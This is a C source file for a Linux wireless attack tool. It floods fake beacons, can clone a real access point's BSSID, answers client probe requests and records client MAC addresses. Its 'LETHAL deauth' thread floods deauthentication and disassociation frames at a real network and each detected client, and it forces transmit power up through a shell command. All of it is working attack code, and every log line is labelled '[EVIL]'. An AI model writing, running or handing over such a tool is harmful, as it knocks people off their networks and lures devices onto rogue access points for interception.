#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>

#undef ifr_name
#include <arpa/inet.h>
#include <pthread.h>

#define MAX_SSID_LEN 32
#define MAX_SSIDS   64
#define FRAME_BUF   4096
#define DEAUTH_REASON 3

static volatile int running = 1;
static unsigned int g_seq = 0;

/* ── Tracked clients ── */
static char detected_clients[256][18];
static int  n_detected = 0;
static pthread_mutex_t clients_lock = PTHREAD_MUTEX_INITIALIZER;

/* ── Pre-built frame templates (built at startup) ── */
static uint8_t beacon_template[MAX_SSIDS][FRAME_BUF];
static int     beacon_len[MAX_SSIDS];
static uint8_t deauth_broadcast[FRAME_BUF];
static int     deauth_broadcast_len;
static uint8_t disassoc_broadcast[FRAME_BUF];
static int     disassoc_broadcast_len;
static uint8_t deauth_ap_to_client[FRAME_BUF];
static int     deauth_ap_to_client_len;
static uint8_t deauth_client_to_ap[FRAME_BUF];
static int     deauth_client_to_ap_len;

/* ── Configuration ── */
static char *g_iface = NULL;
static char **g_ssids = NULL;
static uint8_t (*g_bssids)[6] = NULL;
static int g_n_ssids = 0;
static int g_channel = 6;
static int g_multi = 0;
static int g_deauth = 0;
static uint8_t g_real_bssid[6];
static int g_real_bssid_set = 0;
static int g_probe = 0;
static char *g_ssid_match = NULL;

static void sigint_handler(int sig) { (void)sig; running = 0; }

static void parse_mac(const char *str, uint8_t *mac) {
    unsigned int v[6];
    sscanf(str, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]);
    for (int i=0;i<6;i++) mac[i]=(uint8_t)v[i];
}

static void mac_to_str(const uint8_t *mac, char *out) {
    sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

static void gen_bssid(const char *ssid, uint8_t *bssid) {
    unsigned int seed = (unsigned int)time(NULL);
    for (const char *p=ssid; *p; p++) seed = seed*31 + (unsigned char)*p;
    srand(seed);
    bssid[0] = 0x02;
    for (int i=1;i<6;i++) bssid[i]=(uint8_t)(rand()&0xFF);
}

static int iface_to_index(const char *iface) {
    struct ifreq ifr;
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_ifrn.ifrn_name, iface, IFNAMSIZ-1);
    int sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0) return -1;
    if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) { close(sd); return -1; }
    close(sd);
    return ifr.ifr_ifindex;
}

static int open_af_packet(const char *iface) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }
    int idx = iface_to_index(iface);
    if (idx < 0) { fprintf(stderr,"[EVIL] iface %s not found\n",iface); close(fd); return -1; }
    struct sockaddr_ll sa;
    memset(&sa,0,sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = idx;
    sa.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror("bind"); close(fd); return -1; }
    return fd;
}

static void set_channel(const char *iface, int ch) {
    struct iwreq wr;
    memset(&wr,0,sizeof(wr));
    strncpy(wr.ifr_ifrn.ifrn_name, iface, IFNAMSIZ-1);
    int freq = ch <= 13 ? 2407 + ch*5 : 5000 + ch*5;
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { fprintf(stderr,"[EVIL] set_channel socket failed\n"); return; }
    if (ioctl(fd, SIOCSIWFREQ, &wr) < 0)
        fprintf(stderr,"[EVIL] set_channel ioctl failed: %s\n", strerror(errno));
    close(fd);
}

/* radiotap with Tx flags + rate (present = 0x00000006: bit1=TxFlags, bit2=Rate) */
static void fill_radiotap(uint8_t *buf) {
    buf[0]=0x00; buf[1]=0x00;  /* version + pad */
    buf[2]=0x0E; buf[3]=0x00;  /* length=14 */
    buf[4]=0x06; buf[5]=0x00; buf[6]=0x00; buf[7]=0x00; /* present = TxFlags + Rate */
    buf[8]=0x00; buf[9]=0x00;  /* TxFlags (none) */
    buf[10]=0x02; buf[11]=0x00; /* Rate = 2 Mbps (units 500kbps: 2Mbps = 4 -> 0x04 in next byte) no wait */
}

/* Actually fill_radiotap: let's make radiotap with TxFlags only but set properly */
static int build_radiotap(uint8_t *buf) {
    buf[0]=0x00; buf[1]=0x00;
    buf[2]=0x0C; buf[3]=0x00;
    buf[4]=0x02; buf[5]=0x00; buf[6]=0x00; buf[7]=0x00;
    buf[8]=0x00; buf[9]=0x00; buf[10]=0x00; buf[11]=0x00;
    return 12;
}

/* ── Frame builders ── */

static int build_beacon(uint8_t *buf, const char *ssid, const uint8_t *bssid, int channel) {
    int off=0;
    off += build_radiotap(buf+off);
    buf[off++]=0x80; buf[off++]=0x00;
    buf[off++]=0x00; buf[off++]=0x00;
    memset(buf+off,0xFF,6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    uint16_t sq = (g_seq++ << 4) & 0xFFFF;
    buf[off++]=(uint8_t)(sq&0xFF); buf[off++]=(uint8_t)((sq>>8)&0xFF);
    uint64_t ts = (uint64_t)time(NULL) * 1000000ULL + (uint64_t)(clock()/100);
    memcpy(buf+off, &ts, 8); off+=8;
    buf[off++]=0x64; buf[off++]=0x00;
    buf[off++]=0x11; buf[off++]=0x04;
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
    buf[off++]=0x00; buf[off++]=(uint8_t)ssid_len;
    memcpy(buf+off, ssid, ssid_len); off+=ssid_len;
    static const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24,0x30,0x48,0x60,0x6C};
    buf[off++]=0x01; buf[off++]=0x08;
    memcpy(buf+off, rates, 8); off+=8;
    buf[off++]=0x03; buf[off++]=0x01; buf[off++]=(uint8_t)channel;
    buf[off++]=0x2A; buf[off++]=0x01; buf[off++]=0x00;
    buf[off++]=0x32; buf[off++]=0x04;
    memcpy(buf+off, rates+8, 4); off+=4;
    return off;
}

static int build_deauth(uint8_t *buf, const uint8_t *bssid, const uint8_t *station) {
    int off=0;
    off += build_radiotap(buf+off);
    buf[off++]=0xC0; buf[off++]=0x00;
    buf[off++]=0x00; buf[off++]=0x00;
    memcpy(buf+off, station, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    buf[off++]=0x00; buf[off++]=0x00;
    buf[off++]=(uint8_t)(DEAUTH_REASON&0xFF);
    buf[off++]=(uint8_t)((DEAUTH_REASON>>8)&0xFF);
    return off;
}

static int build_disassoc(uint8_t *buf, const uint8_t *bssid, const uint8_t *station) {
    int off=0;
    off += build_radiotap(buf+off);
    buf[off++]=0xA0; buf[off++]=0x00;
    buf[off++]=0x00; buf[off++]=0x00;
    memcpy(buf+off, station, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    buf[off++]=0x00; buf[off++]=0x00;
    buf[off++]=(uint8_t)(DEAUTH_REASON&0xFF);
    buf[off++]=(uint8_t)((DEAUTH_REASON>>8)&0xFF);
    return off;
}

static int build_probe_resp(uint8_t *buf, const uint8_t *client, const char *ssid, const uint8_t *bssid, int channel) {
    int off=0;
    off += build_radiotap(buf+off);
    buf[off++]=0x50; buf[off++]=0x00;
    buf[off++]=0x00; buf[off++]=0x00;
    memcpy(buf+off, client, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    uint16_t sq_pr = (g_seq++ << 4) & 0xFFFF;
    buf[off++]=(uint8_t)(sq_pr&0xFF); buf[off++]=(uint8_t)((sq_pr>>8)&0xFF);
    uint64_t ts_pr = (uint64_t)time(NULL) * 1000000ULL + (uint64_t)(clock()/100);
    memcpy(buf+off, &ts_pr, 8); off+=8;
    buf[off++]=0x64; buf[off++]=0x00;
    buf[off++]=0x11; buf[off++]=0x04;
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
    buf[off++]=0x00; buf[off++]=(uint8_t)ssid_len;
    memcpy(buf+off, ssid, ssid_len); off+=ssid_len;
    static const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24,0x30,0x48,0x60,0x6C};
    buf[off++]=0x01; buf[off++]=0x08;
    memcpy(buf+off, rates, 8); off+=8;
    buf[off++]=0x03; buf[off++]=0x01; buf[off++]=(uint8_t)channel;
    buf[off++]=0x2A; buf[off++]=0x01; buf[off++]=0x00;
    buf[off++]=0x32; buf[off++]=0x04;
    memcpy(buf+off, rates+8, 4); off+=4;
    return off;
}

/* ═══════════════════════════════════════════════════
 * Pre-build all frame templates (called once at startup)
 * ═══════════════════════════════════════════════════ */
static void prebuild_frames(void) {
    for (int i = 0; i < g_n_ssids; i++) {
        beacon_len[i] = build_beacon(beacon_template[i], g_ssids[i], g_bssids[i], g_channel);
    }

    if (g_real_bssid_set) {
        uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        deauth_broadcast_len = build_deauth(deauth_broadcast, g_real_bssid, broadcast);
        disassoc_broadcast_len = build_disassoc(disassoc_broadcast, g_real_bssid, broadcast);

        /* AP→client template (client MAC filled at runtime at offset 16) */
        uint8_t dummy[6] = {0};
        deauth_ap_to_client_len = build_deauth(deauth_ap_to_client, g_real_bssid, dummy);
        deauth_client_to_ap_len = build_deauth(deauth_client_to_ap, dummy, g_real_bssid);
    }
}

/* ═══════════════════════════════════════════════════
 * THREAD 1: Beacon flood — continuous, no sleep
 * ═══════════════════════════════════════════════════ */
static void* beacon_thread_fn(void *arg) {
    int fd = *(int*)arg;
    int cur = 0;
    long total = 0, last_print = 0;

    while (running) {
        cur = g_multi ? (cur + 1) % g_n_ssids : 0;
        if (send(fd, beacon_template[cur], beacon_len[cur], 0) <= 0) {
            fprintf(stderr, "[EVIL] beacon send error: %s\n", strerror(errno));
        } else {
            total++;
        }
        if (total - last_print >= 500) {
            printf("[EVIL] beacon sent %ld\n", total);
            last_print = total;
        }
    }
    fprintf(stderr, "[EVIL] beacon thread done: %ld total\n", total);
    return NULL;
}

/* ═══════════════════════════════════════════════════
 * THREAD 2: LETHAL deauth — own socket, continuous,
 *            send BOTH deauth + disassoc to ALL clients
 * ═══════════════════════════════════════════════════ */
static void* deauth_thread_fn(void *arg) {
    (void)arg;
    int fd = open_af_packet(g_iface);
    if (fd < 0) {
        fprintf(stderr, "[EVIL] deauth socket failed\n");
        return NULL;
    }

    long total = 0, last_print = 0;
    /* Temporary buffers for targeted frames */
    uint8_t deauth_ap2cl[FRAME_BUF];
    uint8_t deauth_cl2ap[FRAME_BUF];
    uint8_t disassoc_ap2cl[FRAME_BUF];
    uint8_t disassoc_cl2ap[FRAME_BUF];

    while (running) {
        /* ── Broadcast kill: BOTH deauth + disassoc every iteration ── */
        if (send(fd, deauth_broadcast, deauth_broadcast_len, 0) <= 0) {
            fprintf(stderr, "[EVIL] deauth_bcst error: %s\n", strerror(errno));
        } else total++;

        if (send(fd, disassoc_broadcast, disassoc_broadcast_len, 0) <= 0) {
            fprintf(stderr, "[EVIL] disassoc_bcst error: %s\n", strerror(errno));
        } else total++;

        /* ── Targeted kill: ALL detected clients ── */
        pthread_mutex_lock(&clients_lock);
        int n = n_detected;
        for (int i = 0; i < n; i++) {
            uint8_t cmac[6];
            parse_mac(detected_clients[i], cmac);

            int l1 = build_deauth(deauth_ap2cl, g_real_bssid, cmac);
            int l2 = build_disassoc(disassoc_ap2cl, g_real_bssid, cmac);
            int l3 = build_deauth(deauth_cl2ap, cmac, g_real_bssid);
            int l4 = build_disassoc(disassoc_cl2ap, cmac, g_real_bssid);

            if (send(fd, deauth_ap2cl, l1, 0) <= 0)
                fprintf(stderr, "[EVIL] deauth fwd error: %s\n", strerror(errno));
            else total++;
            if (send(fd, disassoc_ap2cl, l2, 0) <= 0)
                fprintf(stderr, "[EVIL] disassoc fwd error: %s\n", strerror(errno));
            else total++;
            if (send(fd, deauth_cl2ap, l3, 0) <= 0)
                fprintf(stderr, "[EVIL] deauth rev error: %s\n", strerror(errno));
            else total++;
            if (send(fd, disassoc_cl2ap, l4, 0) <= 0)
                fprintf(stderr, "[EVIL] disassoc rev error: %s\n", strerror(errno));
            else total++;
        }
        pthread_mutex_unlock(&clients_lock);

        if (total - last_print >= 1500) {
            printf("[EVIL] deauth sent %ld\n", total);
            last_print = total;
        }
    }

    close(fd);
    fprintf(stderr, "[EVIL] deauth thread done: %ld total\n", total);
    return NULL;
}

/* ═══════════════════════════════════════════════════
 * THREAD 3: Probe listener + responder
 * ═══════════════════════════════════════════════════ */
static void* probe_thread_fn(void *arg) {
    int beacon_fd = *(int*)arg;
    int recv_fd = open_af_packet(g_iface);
    if (recv_fd < 0) {
        fprintf(stderr, "[EVIL] probe listener socket failed\n");
        return NULL;
    }

    uint8_t buf[FRAME_BUF];
    uint8_t resp[FRAME_BUF];
    long responded = 0;

    struct timeval tv = {0, 100000};
    setsockopt(recv_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    while (running) {
        int n = recv(recv_fd, buf, sizeof(buf), 0);
        if (n <= 0) continue;

        if (n < 36) continue;
        uint8_t fc = buf[12];
        if ((fc & 0xFC) != 0x40) continue;

        int off = 36;
        int ssid_len = 0;
        char req_ssid[33] = {0};
        while (off + 2 <= n) {
            if (buf[off] == 0x00) {
                ssid_len = buf[off+1];
                if (ssid_len > 32) ssid_len = 32;
                if (off+2+ssid_len <= n) {
                    memcpy(req_ssid, buf+off+2, ssid_len);
                }
                break;
            }
            off += 2 + buf[off+1];
        }

        if (ssid_len == 0) continue;

        int match = 0;
        for (int i=0; i<g_n_ssids; i++) {
            if (strcmp(req_ssid, g_ssids[i]) == 0) { match = 1; break; }
        }
        if (!match && g_ssid_match && strcmp(req_ssid, g_ssid_match) != 0) continue;
        if (!match && !g_ssid_match) continue;

        uint8_t *client_mac = buf + 22;
        char mac_str[18];
        mac_to_str(client_mac, mac_str);

        pthread_mutex_lock(&clients_lock);
        int found=0;
        for (int i=0; i<n_detected; i++) {
            if (strcmp(detected_clients[i], mac_str) == 0) { found=1; break; }
        }
        if (!found && n_detected < 256) {
            strcpy(detected_clients[n_detected++], mac_str);
            printf("[EVIL] client %s probed for '%s'\n", mac_str, req_ssid);
        }
        pthread_mutex_unlock(&clients_lock);

        int ssid_idx = 0;
        for (int i=0; i<g_n_ssids; i++) {
            if (strcmp(req_ssid, g_ssids[i]) == 0) { ssid_idx = i; break; }
        }
        int rlen = build_probe_resp(resp, client_mac, g_ssids[ssid_idx],
                                    g_bssids[ssid_idx], g_channel);
        if (send(beacon_fd, resp, rlen, 0) > 0)
            responded++;
    }

    close(recv_fd);
    printf("[EVIL] probe responder done: %ld responded\n", responded);
    return NULL;
}

/* ═══════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════ */
int main(int argc, char **argv) {
    /* Unbuffer stdout/stderr so Python can read real-time */
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc < 5) {
        fprintf(stderr,
            "Usage: %s <iface> <ssid> <bssid> <channel>\n"
            "       [--multi] [--ssid2 <s2>] ...\n"
            "       [--deauth] [--real-bssid <mac>]\n"
            "       [--probe] [--ssid-match <s>]\n"
            "       [--txpower <dBm>]\n", argv[0]);
        return 1;
    }

    g_iface   = argv[1];
    g_channel = atoi(argv[4]);

    g_ssids  = calloc(MAX_SSIDS, sizeof(char*));
    g_bssids = calloc(MAX_SSIDS, 6);

    g_ssids[0] = argv[2];
    parse_mac(argv[3], g_bssids[0]);
    g_n_ssids = 1;

    for (int i=5; i<argc; i++) {
        if (strcmp(argv[i], "--multi") == 0) {
            g_multi = 1;
        } else if (strcmp(argv[i], "--deauth") == 0) {
            g_deauth = 1;
        } else if (strcmp(argv[i], "--probe") == 0) {
            g_probe = 1;
        } else if (strcmp(argv[i], "--real-bssid") == 0 && i+1 < argc) {
            parse_mac(argv[++i], g_real_bssid);
            g_real_bssid_set = 1;
        } else if (strcmp(argv[i], "--clone-bssid") == 0) {
            memcpy(g_bssids[0], g_real_bssid, 6);
            fprintf(stderr, "[EVIL] cloned real BSSID to fake AP\n");
        } else if (strcmp(argv[i], "--ssid-match") == 0 && i+1 < argc) {
            g_ssid_match = argv[++i];
        } else if (strncmp(argv[i], "--ssid", 6) == 0) {
            char *eq = strchr(argv[i], '=');
            char *val;
            if (eq) val = eq+1;
            else if (i+1 < argc) val = argv[++i];
            else continue;
            if (g_n_ssids >= MAX_SSIDS) continue;
            g_ssids[g_n_ssids] = val;
            gen_bssid(g_ssids[g_n_ssids], g_bssids[g_n_ssids]);
            g_n_ssids++;
        }
    }

    fprintf(stderr, "[EVIL] iface=%s ssids=%d channel=%d\n", g_iface, g_n_ssids, g_channel);
    for (int i=0; i<g_n_ssids; i++) {
        char mac[18];
        mac_to_str(g_bssids[i], mac);
        fprintf(stderr, "[EVIL]   SSID[%d]='%s' BSSID=%s\n", i, g_ssids[i], mac);
    }

    set_channel(g_iface, g_channel);

    {
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "iw dev %s set txpower fixed 3000 2>/dev/null", g_iface);
        system(cmd);
    }

    /* Pre-build all frame templates for zero-latency sending */
    prebuild_frames();

    signal(SIGINT, sigint_handler);

    pthread_t beacon_thread, deauth_thread, probe_thread;

    /* Beacon uses its own socket */
    int beacon_fd = open_af_packet(g_iface);
    if (beacon_fd < 0) { fprintf(stderr, "[EVIL] beacon socket failed\n"); return 1; }
    pthread_create(&beacon_thread, NULL, beacon_thread_fn, &beacon_fd);

    /* Deauth opens its OWN socket (separate from beacon) */
    if (g_deauth && g_real_bssid_set) {
        char m[18]; mac_to_str(g_real_bssid, m);
        fprintf(stderr, "[EVIL] LETHAL DEAUTH → %s (deauth+disassoc, own socket)\n", m);
        pthread_create(&deauth_thread, NULL, deauth_thread_fn, NULL);
    }

    if (g_probe) {
        fprintf(stderr, "[EVIL] probe response enabled\n");
        pthread_create(&probe_thread, NULL, probe_thread_fn, &beacon_fd);
    }

    pthread_join(beacon_thread, NULL);
    if (g_deauth && g_real_bssid_set) pthread_join(deauth_thread, NULL);
    if (g_probe) pthread_join(probe_thread, NULL);

    close(beacon_fd);
    free(g_ssids);
    free(g_bssids);
    return 0;
}
